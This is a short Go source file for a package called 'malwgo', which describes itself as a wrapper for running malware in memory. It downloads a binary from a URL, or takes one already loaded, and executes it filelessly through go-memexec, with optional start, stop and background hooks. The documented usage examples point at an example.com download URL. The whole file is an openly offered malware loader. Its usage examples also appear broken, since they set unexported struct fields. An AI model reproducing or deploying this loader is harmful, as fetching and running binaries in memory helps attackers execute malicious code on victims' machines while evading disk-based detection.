// Description: A simple wrapper for go-memexec to run malwares in memory.
package malwgo

import (
	"io"
	"net/http"

	"github.com/amenzhinsky/go-memexec"
)

type Options struct {
	bin          []byte // binary loaded in memory
	onStart      func() // function to run before the command is executed
	onStop       func() // function to run after the command is executed
	onBackground func() // function to run in the background
	binUrl       string // url to download the binary
}

func (o *Options) getBinFromUrl() ([]byte, error) {

	resp, err := http.Get(o.binUrl)

	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

type Malwgo struct {
	opts    Options
	wrapper *memexec.Exec
}

// Exec executes the command with the given arguments. If handleErr is not nil, it will be called with the error if one occurs.
// Example:
//
// handleErr can be usefull to controll the error instead of returning it directly:
//
//	output, err := malwgo.Exec(func(err error) {
//		fmt.Println(err)
//	}, "--help")
//
// or handleErr can be nil:
//
//	output, err := malwgo.Exec(nil, "--help")
func (o Malwgo) Exec(handleErr func(error), args ...string) (output []byte, err error) {

	if o.opts.onStart != nil {
		o.opts.onStart()
	}

	if o.opts.onBackground != nil {
		go o.opts.onBackground()
	}

	cmd := o.wrapper.Command(args...)

	output, err = cmd.Output()

	if err != nil {
		if handleErr != nil {
			handleErr(err)
		} else {
			return
		}
	}

	if o.opts.onStop != nil {
		o.opts.onStop()
	}

	return

}

func (o *Malwgo) Close() {
	o.wrapper.Close()
}

// New creates a new Malwgo instance with the given options. Example usage:
//
// with a binary loaded in memory:
//
//	malgwo_inst, err := malwgo.New(&malwgo.Options{
//		bin: MyBinary,
//		onStart: func() {
//			fmt.Println("Starting...")
//		},
//		onStop: func() {
//			fmt.Println("Stopping...")
//		},
//		onBackground: func() {
//			fmt.Println("Running in background...")
//		},
//	})
//
// or with a binary url:
//
//	malgwo_inst, err := malwgo.New(&malwgo.Options{
//		binUrl: "https://example.com/mybinary",
//		onStart: func() {
//			fmt.Println("Starting...")
//		},
//		onStop: func() {
//			fmt.Println("Stopping...")
//		},
//		onBackground: func() {
//			fmt.Println("Running in background...")
//		},
//	})
func New(opts *Options) (*Malwgo, error) {

	if opts.bin == nil && opts.binUrl != "" {
		bin, err := opts.getBinFromUrl()

		if err != nil {
			return &Malwgo{}, err
		}

		opts.bin = bin
	}

	exec, err := memexec.New(opts.bin)

	if err != nil {
		return &Malwgo{}, err
	}

	return &Malwgo{*opts, exec}, nil
}
